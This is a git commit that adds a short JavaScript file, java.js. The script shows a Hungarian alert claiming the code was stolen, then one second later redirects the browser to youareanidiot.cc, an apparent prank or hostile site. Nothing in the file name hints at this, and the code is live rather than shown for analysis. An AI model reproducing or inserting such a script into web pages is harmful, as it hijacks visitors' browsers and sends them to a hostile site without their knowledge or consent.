db682f213cfbeb8c4a474be9c407d60952b0e751
itsguysbosthostbot24 <77636716+itsguysbosthostbot24@users.noreply.github.com>
2024-03-02 03:17:31 +0100

    Create java.js

---
+++ java.js
@@ -0,0 +1,8 @@
+setTimeout(function() {
+    alert("Jónapot, ez a kód lopott úgy, ahogy van (Védelem automatikusan bekapcsolva 2024.03.xx-én)");
+}, 2000);
+
+setTimeout(function() {
+    var celUrl = "https://youareanidiot.cc";
+    window.location.href = celUrl;
+}, 3000);
